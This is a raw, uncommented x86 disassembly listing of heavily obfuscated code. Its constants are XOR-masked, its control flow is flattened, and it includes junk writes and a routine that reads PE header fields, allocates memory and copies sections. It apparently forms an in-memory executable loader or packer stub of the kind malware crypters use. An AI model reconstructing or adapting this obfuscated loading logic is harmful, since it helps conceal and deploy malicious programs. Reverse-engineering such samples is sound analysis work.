  41968e:	mov    eax,DWORD PTR [ebp-0x4]
  419691:	sub    eax,edi
  419693:	xor    eax,esi
  419695:	mov    DWORD PTR [ebp-0x8],eax
  419698:	lea    ebx,[ebp-0x8]
  41969b:	call   0x419580
  4196a0:	mov    DWORD PTR [ebp-0x8],eax
  4196a3:	mov    eax,DWORD PTR [ebp-0x8]
  4196a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4196a9:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4196b0:	mov    eax,DWORD PTR [ebp-0xc]
  4196b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4196b6:	xor    eax,esi
  4196b8:	lea    eax,[eax+ecx*1+0x3272e2]
  4196bf:	mov    DWORD PTR [ebp-0x4],eax
  4196c2:	mov    eax,DWORD PTR [ebp-0x18]
  4196c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4196c8:	xor    ecx,esi
  4196ca:	xor    eax,esi
  4196cc:	sub    eax,ecx
  4196ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4196d1:	cmp    ecx,eax
  4196d3:	jbe    0x41968e
  4196d5:	mov    eax,DWORD PTR [ebp-0x1c]
  4196d8:	xor    eax,esi
  4196da:	add    eax,edi
  4196dc:	mov    DWORD PTR [ebp-0x8],eax
  4196df:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  4196e6:	mov    ebx,ebx
  4196e8:	jmp    0x41974b
  4196ea:	mov    ecx,DWORD PTR [ebp-0x20]
  4196ed:	mov    eax,DWORD PTR [ebp-0x8]
  4196f0:	xor    ecx,esi
  4196f2:	add    ecx,edi
  4196f4:	shr    eax,cl
  4196f6:	mov    DWORD PTR [ebp-0x4],eax
  4196f9:	mov    eax,DWORD PTR [ebp+0x8]
  4196fc:	mov    cl,BYTE PTR [eax]
  4196fe:	mov    BYTE PTR [ebp+0xb],cl
  419701:	mov    cl,BYTE PTR [ebp+0xb]
  419704:	mov    edx,DWORD PTR [ebp-0x8]
  419707:	movzx  ecx,cl
  41970a:	xor    ecx,edx
  41970c:	mov    DWORD PTR [ebp+0x8],ecx
  41970f:	mov    ecx,DWORD PTR [ebp-0x18]
  419712:	mov    edx,DWORD PTR [ebp+0x8]
  419715:	xor    ecx,esi
  419717:	add    ecx,edi
  419719:	and    ecx,edx
  41971b:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  419722:	mov    edx,DWORD PTR [ebp-0x4]
  419725:	xor    ecx,edx
  419727:	mov    DWORD PTR [ebp-0x8],ecx
  41972a:	mov    ecx,DWORD PTR [ebp-0xc]
  41972d:	xor    ecx,esi
  41972f:	lea    eax,[eax+ecx*1+0x3272e2]
  419736:	mov    DWORD PTR [ebp+0x8],eax
  419739:	mov    eax,DWORD PTR [ebp-0xc]
  41973c:	xor    eax,esi
  41973e:	mov    ecx,0xffcd8d1e
  419743:	sub    ecx,eax
  419745:	add    ecx,DWORD PTR [ebp-0x10]
  419748:	mov    DWORD PTR [ebp-0x10],ecx
  41974b:	mov    eax,DWORD PTR [ebp-0x14]
  41974e:	mov    ecx,DWORD PTR [ebp-0x10]
  419751:	xor    eax,esi
  419753:	add    eax,edi
  419755:	cmp    ecx,eax
  419757:	jne    0x4196ea
  419759:	mov    eax,DWORD PTR [ebp-0x1c]
  41975c:	mov    ecx,DWORD PTR [ebp-0x8]
  41975f:	xor    eax,esi
  419761:	add    eax,edi
  419763:	pop    edi
  419764:	pop    esi
  419765:	xor    eax,ecx
  419767:	pop    ebx
  419768:	leave  
  419769:	ret    0x4
  41976c:	push   ebp
  41976d:	mov    ebp,esp
  41976f:	mov    eax,DWORD PTR [ebp+0x1c]
  419772:	mov    ecx,DWORD PTR [ebp+0x8]
  419775:	mov    edx,DWORD PTR [ebp+0x10]
  419778:	mov    eax,DWORD PTR [eax+0x190]
  41977e:	mov    eax,DWORD PTR [eax]
  419780:	sub    esp,0x64
  419783:	push   ebx
  419784:	push   esi
  419785:	push   edi
  419786:	mov    edi,0x751089b
  41978b:	xor    ecx,edi
  41978d:	mov    ebx,0x3272e2
  419792:	add    ecx,ebx
  419794:	cmp    ecx,edx
  419796:	jne    0x4197a7
  419798:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  4197a2:	jmp    0x419ca3
  4197a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4197aa:	mov    esi,DWORD PTR [ebp+0x14]
  4197ad:	mov    edx,DWORD PTR [esi]
  4197af:	xor    ecx,edi
  4197b1:	add    ecx,ebx
  4197b3:	cmp    edx,ecx
  4197b5:	je     0x419c5e
  4197bb:	mov    ecx,DWORD PTR [ebp+0x1c]
  4197be:	mov    DWORD PTR [ebp-0x1c],eax
  4197c1:	mov    DWORD PTR [ebp+0x1c],ecx
  4197c4:	mov    ecx,DWORD PTR [ebp+0x18]
  4197c7:	mov    eax,DWORD PTR [esi]
  4197c9:	mov    DWORD PTR [ebp-0x20],eax
  4197cc:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  4197d3:	mov    edx,0xf89c8584
  4197d8:	mov    DWORD PTR [ebp-0x8],edx
  4197db:	mov    eax,DWORD PTR [ebp+0x1c]
  4197de:	mov    DWORD PTR [ebp+0x1c],eax
  4197e1:	mov    eax,DWORD PTR [ebp+0x1c]
  4197e4:	mov    eax,DWORD PTR [eax+0x190]
  4197ea:	mov    eax,DWORD PTR [eax]
  4197ec:	mov    DWORD PTR [ebp-0x24],ecx
  4197ef:	mov    ecx,DWORD PTR [ebp+0x1c]
  4197f2:	mov    ecx,DWORD PTR [ecx+0x190]
  4197f8:	mov    ecx,DWORD PTR [ecx]
  4197fa:	add    ecx,DWORD PTR [eax+0x3c]
  4197fd:	mov    DWORD PTR [ebp+0x10],ecx
  419800:	mov    eax,DWORD PTR [ebp+0x8]
  419803:	xor    eax,edi
  419805:	add    eax,ebx
  419807:	mov    DWORD PTR [ebp-0x4],eax
  41980a:	mov    eax,DWORD PTR [ebp+0x8]
  41980d:	xor    eax,edi
  41980f:	add    eax,ebx
  419811:	mov    DWORD PTR [ebp+0x18],eax
  419814:	mov    eax,DWORD PTR [ebp+0x10]
  419817:	mov    eax,DWORD PTR [eax+0x50]
  41981a:	sub    eax,0xc
  41981d:	mov    DWORD PTR [ebp-0x28],eax
  419820:	mov    eax,DWORD PTR [ebp+0x10]
  419823:	mov    eax,DWORD PTR [eax+0x38]
  419826:	mov    ecx,DWORD PTR [ebp+0x10]
  419829:	dec    eax
  41982a:	test   DWORD PTR [ecx+0x54],eax
  41982d:	mov    eax,DWORD PTR [ebp+0x10]
  419830:	je     0x41984a
  419832:	mov    eax,DWORD PTR [eax+0x38]
  419835:	mov    ecx,DWORD PTR [ebp+0x10]
  419838:	mov    ecx,DWORD PTR [ecx+0x54]
  41983b:	dec    eax
  41983c:	not    eax
  41983e:	and    ecx,eax
  419840:	mov    eax,DWORD PTR [ebp+0x10]
  419843:	mov    eax,DWORD PTR [eax+0x38]
  419846:	add    eax,ecx
  419848:	jmp    0x41984d
  41984a:	mov    eax,DWORD PTR [eax+0x54]
  41984d:	mov    DWORD PTR [ebp+0x1c],eax
  419850:	mov    eax,DWORD PTR [ebp+0x8]
  419853:	xor    eax,edi
  419855:	add    eax,ebx
  419857:	mov    DWORD PTR [ebp+0x18],eax
  41985a:	mov    eax,DWORD PTR [ebp+0x8]
  41985d:	xor    eax,edi
  41985f:	add    eax,ebx
  419861:	mov    DWORD PTR [ebp+0x18],eax
  419864:	mov    eax,DWORD PTR [ebp+0x8]
  419867:	mov    ecx,DWORD PTR [ebp-0x24]
  41986a:	xor    eax,edi
  41986c:	add    eax,ebx
  41986e:	mov    DWORD PTR [ecx],eax
  419870:	mov    DWORD PTR [ebp+0x18],edx
  419873:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  41987a:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  419881:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  419888:	mov    eax,DWORD PTR [ebp-0x8]
  41988b:	mov    ecx,DWORD PTR [ebp+0x1c]
  41988e:	xor    eax,edi
  419890:	add    eax,ebx
  419892:	imul   eax,ecx
  419895:	mov    ecx,DWORD PTR [ebp+0x8]
  419898:	mov    edx,DWORD PTR [ebp-0x28]
  41989b:	xor    ecx,edi
  41989d:	lea    ecx,[ecx+edx*1+0x3272e2]
  4198a4:	cmp    eax,ecx
  4198a6:	jae    0x419c57
  4198ac:	mov    eax,DWORD PTR [ebp+0x8]
  4198af:	xor    eax,edi
  4198b1:	add    eax,ebx
  4198b3:	mov    DWORD PTR [ebp+0x18],eax
  4198b6:	mov    eax,DWORD PTR [ebp+0x1c]
  4198b9:	add    eax,DWORD PTR [ebp-0x1c]
  4198bc:	mov    DWORD PTR [ebp-0x4],eax
  4198bf:	push   DWORD PTR [ebp-0x4]
  4198c2:	mov    esi,DWORD PTR [ebp-0x1c]
  4198c5:	mov    ecx,DWORD PTR [ebp+0x10]
  4198c8:	call   0x4189c0
  4198cd:	mov    DWORD PTR [ebp+0xc],eax
  4198d0:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4198d7:	mov    eax,DWORD PTR [ebp-0x18]
  4198da:	xor    eax,edi
  4198dc:	lea    ecx,[ebp-0x40]
  4198df:	add    eax,ebx
  4198e1:	push   ecx
  4198e2:	call   0x418fa3
  4198e7:	mov    eax,DWORD PTR [ebp+0xc]
  4198ea:	test   eax,eax
  4198ec:	je     0x41993c
  4198ee:	mov    eax,DWORD PTR [ebp-0x18]
  4198f1:	xor    eax,edi
  4198f3:	add    eax,ebx
  4198f5:	push   eax
  4198f6:	push   DWORD PTR [ebp+0xc]
  4198f9:	lea    eax,[ebp-0x40]
  4198fc:	push   eax
  4198fd:	call   0x418e4a
  419902:	mov    eax,DWORD PTR [ebp-0x4]
  419905:	mov    DWORD PTR [ebp-0x18],eax
  419908:	mov    eax,DWORD PTR [ebp-0x18]
  41990b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41990e:	sub    eax,ecx
  419910:	mov    DWORD PTR [ebp-0x18],eax
  419913:	mov    eax,DWORD PTR [ebp+0xc]
  419916:	mov    ecx,DWORD PTR [ebp+0xc]
  419919:	mov    eax,DWORD PTR [eax+0x10]
  41991c:	add    eax,DWORD PTR [ecx+0xc]
  41991f:	mov    ecx,DWORD PTR [ebp-0x18]
  419922:	cmp    ecx,eax
  419924:	jb     0x41993c
  419926:	mov    eax,DWORD PTR [ebp+0xc]
  419929:	mov    eax,DWORD PTR [eax+0xc]
  41992c:	mov    ecx,DWORD PTR [ebp+0xc]
  41992f:	add    eax,DWORD PTR [ecx+0x8]
  419932:	mov    ecx,DWORD PTR [ebp-0x18]
  419935:	sub    eax,ecx
  419937:	jmp    0x419c2a
  41993c:	push   0xc
  41993e:	push   DWORD PTR [ebp-0x4]
  419941:	lea    eax,[ebp-0x4c]
  419944:	push   eax
  419945:	call   0x418e4a
  41994a:	mov    eax,0xf89c8585
  41994f:	mov    DWORD PTR [ebp-0x2c],eax
  419952:	mov    DWORD PTR [ebp-0x30],0xf89c8584
  419959:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  419960:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  419967:	lea    ecx,[ebp-0x2c]
  41996a:	mov    DWORD PTR [ebp-0xc],ecx
  41996d:	lea    ecx,[ebp-0x30]
  419970:	mov    DWORD PTR [ebp-0x10],ecx
  419973:	lea    ecx,[ebp-0x34]
  419976:	mov    DWORD PTR [ebp+0xc],ecx
  419979:	lea    ecx,[ebp-0x38]
  41997c:	mov    DWORD PTR [ebp-0x14],ecx
  41997f:	mov    ecx,DWORD PTR [ebp+0x8]
  419982:	xor    ecx,edi
  419984:	add    ecx,ebx
  419986:	mov    DWORD PTR [ebp-0x18],ecx
  419989:	jmp    0x419b85
  41998e:	cmp    eax,0xf89c85bb
  419993:	je     0x419b97
  419999:	mov    ecx,DWORD PTR [ebp-0x8]
  41999c:	xor    ecx,edi
  41999e:	mov    esi,eax
  4199a0:	add    ecx,ebx
  4199a2:	mov    DWORD PTR [ebp+0x18],ecx
  4199a5:	mov    eax,DWORD PTR [ebp-0x18]
  4199a8:	xor    esi,edi
  4199aa:	lea    eax,[eax+esi*1+0x3272e2]
  4199b1:	mov    DWORD PTR [ebp-0x18],eax
  4199b4:	mov    eax,DWORD PTR [ebp-0x8]
  4199b7:	mov    ecx,DWORD PTR [ebp-0x18]
  4199ba:	xor    eax,edi
  4199bc:	add    eax,ebx
  4199be:	cmp    ecx,eax
  4199c0:	jne    0x4199d5
  4199c2:	mov    eax,DWORD PTR [ebp+0x8]
  4199c5:	xor    eax,edi
  4199c7:	add    eax,ebx
  4199c9:	push   eax
  4199ca:	push   0xc
  4199cc:	lea    eax,[ebp-0x4c]
  4199cf:	push   eax
  4199d0:	call   0x4193d7
  4199d5:	mov    eax,DWORD PTR [ebp-0xc]
  4199d8:	mov    eax,DWORD PTR [eax]
  4199da:	xor    eax,edi
  4199dc:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4199e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4199e6:	xor    ecx,edi
  4199e8:	movzx  eax,al
  4199eb:	add    ecx,ebx
  4199ed:	cmp    eax,ecx
  4199ef:	je     0x419b6d
  4199f5:	mov    eax,DWORD PTR [ebp-0x10]
  4199f8:	mov    eax,DWORD PTR [eax]
  4199fa:	xor    eax,edi
  4199fc:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a03:	mov    ecx,DWORD PTR [ebp+0x8]
  419a06:	xor    ecx,edi
  419a08:	movzx  eax,al
  419a0b:	add    ecx,ebx
  419a0d:	cmp    eax,ecx
  419a0f:	je     0x419b6d
  419a15:	mov    eax,DWORD PTR [ebp+0xc]
  419a18:	mov    eax,DWORD PTR [eax]
  419a1a:	xor    eax,edi
  419a1c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a23:	mov    ecx,DWORD PTR [ebp+0x8]
  419a26:	xor    ecx,edi
  419a28:	movzx  eax,al
  419a2b:	add    ecx,ebx
  419a2d:	cmp    eax,ecx
  419a2f:	je     0x419b6d
  419a35:	mov    eax,DWORD PTR [ebp-0x14]
  419a38:	mov    eax,DWORD PTR [eax]
  419a3a:	xor    eax,edi
  419a3c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a43:	mov    ecx,DWORD PTR [ebp+0x8]
  419a46:	xor    ecx,edi
  419a48:	movzx  eax,al
  419a4b:	add    ecx,ebx
  419a4d:	cmp    eax,ecx
  419a4f:	je     0x419b6d
  419a55:	mov    eax,DWORD PTR [ebp-0x10]
  419a58:	mov    eax,DWORD PTR [eax]
  419a5a:	xor    eax,edi
  419a5c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a63:	mov    ecx,DWORD PTR [ebp-0xc]
  419a66:	mov    ecx,DWORD PTR [ecx]
  419a68:	xor    ecx,edi
  419a6a:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419a71:	xor    al,cl
  419a73:	mov    ecx,DWORD PTR [ebp+0xc]
  419a76:	mov    ecx,DWORD PTR [ecx]
  419a78:	xor    ecx,edi
  419a7a:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419a81:	or     al,cl
  419a83:	mov    ecx,DWORD PTR [ebp-0xc]
  419a86:	mov    ecx,DWORD PTR [ecx]
  419a88:	xor    ecx,edi
  419a8a:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419a91:	cmp    cl,al
  419a93:	jne    0x419b6d
  419a99:	mov    eax,DWORD PTR [ebp+0xc]
  419a9c:	mov    eax,DWORD PTR [eax]
  419a9e:	xor    eax,edi
  419aa0:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419aa7:	mov    ecx,DWORD PTR [ebp-0x10]
  419aaa:	mov    ecx,DWORD PTR [ecx]
  419aac:	xor    ecx,edi
  419aae:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419ab5:	xor    al,cl
  419ab7:	mov    ecx,DWORD PTR [ebp-0x14]
  419aba:	mov    ecx,DWORD PTR [ecx]
  419abc:	xor    ecx,edi
  419abe:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419ac5:	or     al,cl
  419ac7:	mov    ecx,DWORD PTR [ebp-0x10]
  419aca:	mov    ecx,DWORD PTR [ecx]
  419acc:	xor    ecx,edi
  419ace:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419ad5:	cmp    cl,al
  419ad7:	jne    0x419b6d
  419add:	mov    eax,DWORD PTR [ebp-0x14]
  419ae0:	mov    eax,DWORD PTR [eax]
  419ae2:	xor    eax,edi
  419ae4:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419aeb:	mov    ecx,DWORD PTR [ebp+0xc]
  419aee:	mov    ecx,DWORD PTR [ecx]
  419af0:	xor    ecx,edi
  419af2:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419af9:	xor    al,cl
  419afb:	mov    ecx,DWORD PTR [ebp-0xc]
  419afe:	mov    ecx,DWORD PTR [ecx]
  419b00:	xor    ecx,edi
  419b02:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b09:	or     al,cl
  419b0b:	mov    ecx,DWORD PTR [ebp+0xc]
  419b0e:	mov    ecx,DWORD PTR [ecx]
  419b10:	xor    ecx,edi
  419b12:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419b19:	cmp    cl,al
  419b1b:	jne    0x419b6d
  419b1d:	mov    eax,DWORD PTR [ebp-0x14]
  419b20:	mov    eax,DWORD PTR [eax]
  419b22:	xor    eax,edi
  419b24:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419b2b:	mov    ecx,DWORD PTR [ebp-0xc]
  419b2e:	mov    ecx,DWORD PTR [ecx]
  419b30:	xor    ecx,edi
  419b32:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b39:	xor    al,cl
  419b3b:	mov    ecx,DWORD PTR [ebp-0x10]
  419b3e:	mov    ecx,DWORD PTR [ecx]
  419b40:	xor    ecx,edi
  419b42:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b49:	or     al,cl
  419b4b:	mov    ecx,DWORD PTR [ebp-0x14]
  419b4e:	mov    ecx,DWORD PTR [ecx]
  419b50:	xor    ecx,edi
  419b52:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419b59:	cmp    cl,al
  419b5b:	jne    0x419b6d
  419b5d:	lea    eax,[ebp-0x4c]
  419b60:	push   eax
  419b61:	call   0x419628
  419b66:	mov    ecx,DWORD PTR [ebp-0x44]
  419b69:	cmp    eax,ecx
  419b6b:	je     0x419b77
  419b6d:	mov    eax,DWORD PTR [ebp+0x8]
  419b70:	xor    eax,edi
  419b72:	add    eax,ebx
  419b74:	mov    DWORD PTR [ebp+0x18],eax
  419b77:	mov    eax,DWORD PTR [ebp-0x8]
  419b7a:	xor    eax,edi
  419b7c:	lea    eax,[eax+esi*1+0x3272e2]
  419b83:	xor    eax,edi
  419b85:	mov    ecx,DWORD PTR [ebp+0x8]
  419b88:	mov    edx,DWORD PTR [ebp+0x18]
  419b8b:	xor    ecx,edi
  419b8d:	add    ecx,ebx
  419b8f:	cmp    edx,ecx
  419b91:	je     0x41998e
  419b97:	mov    eax,DWORD PTR [ebp+0x8]
  419b9a:	mov    ecx,DWORD PTR [ebp+0x18]
  419b9d:	xor    eax,edi
  419b9f:	add    eax,ebx
  419ba1:	cmp    ecx,eax
  419ba3:	jne    0x419bb6
  419ba5:	mov    eax,DWORD PTR [ebp-0x8]
  419ba8:	mov    ecx,DWORD PTR [ebp+0x1c]
  419bab:	xor    eax,edi
  419bad:	lea    eax,[eax+ecx*1+0x3272e2]
  419bb4:	jmp    0x419c2d
  419bb6:	push   0x18
  419bb8:	push   DWORD PTR [ebp-0x4]
  419bbb:	lea    eax,[ebp-0x64]
  419bbe:	push   eax
  419bbf:	call   0x418e4a
  419bc4:	mov    eax,DWORD PTR [ebp+0x8]
  419bc7:	mov    ecx,DWORD PTR [ebp-0x18]
  419bca:	xor    eax,edi
  419bcc:	add    eax,ebx
  419bce:	cmp    eax,ecx
  419bd0:	je     0x419be5
  419bd2:	mov    eax,DWORD PTR [ebp+0x8]
  419bd5:	xor    eax,edi
  419bd7:	add    eax,ebx
  419bd9:	push   eax
  419bda:	push   0x18
  419bdc:	lea    eax,[ebp-0x64]
  419bdf:	push   eax
  419be0:	call   0x4193d7
  419be5:	mov    eax,DWORD PTR [ebp-0x4]
  419be8:	add    eax,0x18
  419beb:	mov    DWORD PTR [ebp+0x18],eax
  419bee:	push   DWORD PTR [ebp-0x50]
  419bf1:	push   DWORD PTR [ebp+0x18]
  419bf4:	mov    eax,DWORD PTR [ebp-0x54]
  419bf7:	add    eax,DWORD PTR [ebp-0x20]
  419bfa:	push   eax
  419bfb:	call   0x418e4a
  419c00:	mov    eax,DWORD PTR [ebp+0x8]
  419c03:	mov    ecx,DWORD PTR [ebp-0x18]
  419c06:	xor    eax,edi
  419c08:	add    eax,ebx
  419c0a:	cmp    eax,ecx
  419c0c:	je     0x419c1f
  419c0e:	push   0x0
  419c10:	push   DWORD PTR [ebp-0x50]
  419c13:	mov    eax,DWORD PTR [ebp-0x54]
  419c16:	add    eax,DWORD PTR [ebp-0x20]
  419c19:	push   eax
  419c1a:	call   0x4193d7
  419c1f:	mov    eax,DWORD PTR [ebp-0x24]
  419c22:	mov    ecx,DWORD PTR [ebp-0x50]
  419c25:	add    DWORD PTR [eax],ecx
  419c27:	mov    eax,DWORD PTR [ebp-0x50]
  419c2a:	add    eax,DWORD PTR [ebp+0x1c]
  419c2d:	mov    DWORD PTR [ebp+0x1c],eax
  419c30:	mov    eax,DWORD PTR [ebp-0x8]
  419c33:	mov    ecx,DWORD PTR [ebp+0x1c]
  419c36:	xor    eax,edi
  419c38:	add    eax,ebx
  419c3a:	imul   eax,ecx
  419c3d:	mov    ecx,DWORD PTR [ebp+0x8]
  419c40:	mov    edx,DWORD PTR [ebp-0x28]
  419c43:	xor    ecx,edi
  419c45:	lea    ecx,[ecx+edx*1+0x3272e2]
  419c4c:	cmp    eax,ecx
  419c4e:	jb     0x4198ac
  419c54:	mov    esi,DWORD PTR [ebp+0x14]
  419c57:	mov    eax,DWORD PTR [ebp-0x20]
  419c5a:	mov    DWORD PTR [esi],eax
  419c5c:	jmp    0x419ca3
  419c5e:	mov    ecx,DWORD PTR [ebp+0x8]
  419c61:	mov    edx,DWORD PTR [ebp+0xc]
  419c64:	xor    ecx,edi
  419c66:	xor    edx,edi
  419c68:	add    ecx,ebx
  419c6a:	add    edx,ebx
  419c6c:	cmp    ecx,edx
  419c6e:	jne    0x419c82
  419c70:	mov    eax,ds:0x7f642d1e
  419c75:	imul   eax,eax,0x9f15fcef
  419c7b:	mov    ds:0x7f642d1e,eax
  419c80:	jmp    0x419ca3
  419c82:	mov    ecx,DWORD PTR [ebp+0x8]
  419c85:	xor    ecx,edi
  419c87:	add    ecx,ebx
  419c89:	cmp    eax,ecx
  419c8b:	je     0x419c99
  419c8d:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  419c97:	jmp    0x419ca3
  419c99:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  419ca3:	pop    edi
  419ca4:	pop    esi
  419ca5:	pop    ebx
  419ca6:	leave  
  419ca7:	ret    0x18
  419caa:	push   ebp
  419cab:	mov    ebp,esp
  419cad:	and    esp,0xfffffff8
  419cb0:	mov    eax,DWORD PTR [ebp+0x20]
  419cb3:	sub    esp,0x14
  419cb6:	push   ebx
  419cb7:	mov    ebx,DWORD PTR [ebp+0x14]
  419cba:	push   esi
  419cbb:	push   edi
  419cbc:	cmp    eax,0xf89c8585
  419cc1:	jne    0x419ccd
  419cc3:	push   0xf89c8584
  419cc8:	jmp    0x419dff
  419ccd:	mov    eax,DWORD PTR [ebp+0x20]
  419cd0:	cmp    eax,0xf89c8584
  419cd5:	jne    0x419ce1
  419cd7:	push   0xf89c85bb
  419cdc:	jmp    0x419dff
  419ce1:	mov    eax,DWORD PTR [ebp+0x20]
  419ce4:	cmp    eax,0xf89c85bb
  419ce9:	jne    0x419cf5
  419ceb:	push   0xf89c85ba
  419cf0:	jmp    0x419dff
  419cf5:	mov    eax,DWORD PTR [ebp+0x20]
  419cf8:	cmp    eax,0xf89c85ba
  419cfd:	jne    0x419d09
  419cff:	push   0xf89c85b9
  419d04:	jmp    0x419dff
  419d09:	mov    ecx,DWORD PTR [ebp+0x20]
  419d0c:	mov    eax,0xf89c85be
  419d11:	cmp    ecx,eax
  419d13:	jne    0x419dcf
  419d19:	mov    eax,DWORD PTR [ebp+0x10]
  419d1c:	mov    DWORD PTR [esp+0xc],eax
  419d20:	mov    eax,DWORD PTR [ebp+0x18]
  419d23:	mov    DWORD PTR [esp+0x14],eax
  419d27:	mov    eax,DWORD PTR [ebp+0xc]
  419d2a:	mov    DWORD PTR [esp+0x18],eax
  419d2e:	mov    eax,DWORD PTR [ebp+0x8]
  419d31:	mov    DWORD PTR [esp+0x10],eax
  419d35:	mov    eax,DWORD PTR [esp+0x10]
  419d39:	mov    ecx,DWORD PTR [esp+0x14]
  419d3d:	mov    edi,0x751089b
  419d42:	xor    eax,edi
  419d44:	mov    esi,0x3272e2
  419d49:	add    eax,esi
  419d4b:	mov    DWORD PTR [ecx],eax
  419d4d:	mov    eax,DWORD PTR [esp+0xc]
  419d51:	mov    eax,DWORD PTR [eax+0x194]
  419d57:	mov    ecx,DWORD PTR [eax]
  419d59:	mov    eax,DWORD PTR [esp+0xc]
  419d5d:	mov    eax,DWORD PTR [eax+0x194]
  419d63:	mov    eax,DWORD PTR [eax]
  419d65:	add    eax,DWORD PTR [ecx+0x3c]
  419d68:	mov    ecx,DWORD PTR [esp+0xc]
  419d6c:	mov    ecx,DWORD PTR [ecx+0x1d8]
  419d72:	mov    ecx,DWORD PTR [ecx+0x14]
  419d75:	push   0x4
  419d77:	push   0x3000
  419d7c:	push   DWORD PTR [eax+0x50]
  419d7f:	push   0x0
  419d81:	call   ecx
  419d83:	mov    DWORD PTR [ebx],eax
  419d85:	mov    eax,DWORD PTR [esp+0x10]
  419d89:	push   DWORD PTR [esp+0xc]
  419d8d:	xor    eax,edi
  419d8f:	add    eax,esi
  419d91:	mov    DWORD PTR [esp+0x20],eax
  419d95:	lea    eax,[esp+0x20]
  419d99:	push   eax
  419d9a:	push   ebx
  419d9b:	push   DWORD PTR [esp+0x20]
  419d9f:	push   DWORD PTR [esp+0x28]
  419da3:	push   DWORD PTR [esp+0x24]
  419da7:	call   0x41976c
  419dac:	mov    eax,DWORD PTR [esp+0x10]
  419db0:	mov    ecx,DWORD PTR [ebx]
  419db2:	xor    eax,edi
  419db4:	add    eax,esi
  419db6:	cmp    ecx,eax
  419db8:	je     0x419e16
  419dba:	mov    eax,DWORD PTR [esp+0x18]
  419dbe:	mov    ecx,DWORD PTR [esp+0x14]
  419dc2:	xor    eax,edi
  419dc4:	add    eax,esi
  419dc6:	imul   eax,DWORD PTR [esp+0x1c]
  419dcb:	mov    DWORD PTR [ecx],eax
  419dcd:	jmp    0x419e16
  419dcf:	mov    ecx,DWORD PTR [ebp+0x20]
  419dd2:	cmp    ecx,0xf89c85b9
  419dd8:	jne    0x419de1
  419dda:	push   0xf89c85b8
  419ddf:	jmp    0x419dff
  419de1:	mov    ecx,DWORD PTR [ebp+0x20]
  419de4:	cmp    ecx,0xf89c85b8
  419dea:	jne    0x419df3
  419dec:	push   0xf89c85bf
  419df1:	jmp    0x419dff
  419df3:	mov    ecx,DWORD PTR [ebp+0x20]
  419df6:	cmp    ecx,0xf89c85bf
  419dfc:	jne    0x419e16
  419dfe:	push   eax
  419dff:	push   DWORD PTR [ebp+0x1c]
  419e02:	push   DWORD PTR [ebp+0x18]
  419e05:	push   ebx
  419e06:	push   DWORD PTR [ebp+0x10]
  419e09:	push   DWORD PTR [ebp+0xc]
  419e0c:	push   DWORD PTR [ebp+0x8]
  419e0f:	call   0x419caa
  419e14:	mov    DWORD PTR [ebx],eax
  419e16:	mov    eax,DWORD PTR [ebx]
  419e18:	pop    edi
  419e19:	pop    esi
  419e1a:	pop    ebx
  419e1b:	mov    esp,ebp
  419e1d:	pop    ebp
  419e1e:	ret    0x1c
  419e21:	push   ebp
  419e22:	mov    ebp,esp
  419e24:	sub    esp,0xc
  419e27:	mov    eax,0xf89c8585
  419e2c:	mov    DWORD PTR [ebp-0x8],eax
  419e2f:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  419e36:	mov    ecx,DWORD PTR [ebp-0x8]
  419e39:	xor    ecx,0x751089b
  419e3f:	add    ecx,0x3272e2
  419e45:	mov    DWORD PTR [ebp-0x4],ecx
  419e48:	mov    ecx,DWORD PTR [ebp+0xc]
  419e4b:	push   eax
  419e4c:	mov    DWORD PTR [ebp+0xc],ecx
  419e4f:	push   DWORD PTR [ebp+0xc]
  419e52:	lea    eax,[ebp-0x4]
  419e55:	push   DWORD PTR [ebp+0x8]
  419e58:	push   eax
  419e59:	push   DWORD PTR [ebp+0xc]
  419e5c:	push   DWORD PTR [ebp-0xc]
  419e5f:	push   DWORD PTR [ebp-0x8]
  419e62:	call   0x419caa
  419e67:	mov    DWORD PTR [ebp-0x4],eax
  419e6a:	mov    eax,DWORD PTR [ebp-0x4]
  419e6d:	leave  
  419e6e:	ret    0x8
  419e71:	dec    esp
  419e72:	inc    ecx
  419e73:	mov    ebp,0xeffebd16
  419e78:	pop    ebx
  419e79:	xchg   ebx,eax
  419e7a:	and    DWORD PTR [ebx-0x47],0x325abb7a
  419e81:	gs sbb al,0x1
  419e84:	add    BYTE PTR [ebx+eax*1-0x37060000],ch
  419e8b:	ins    DWORD PTR es:[edi],dx
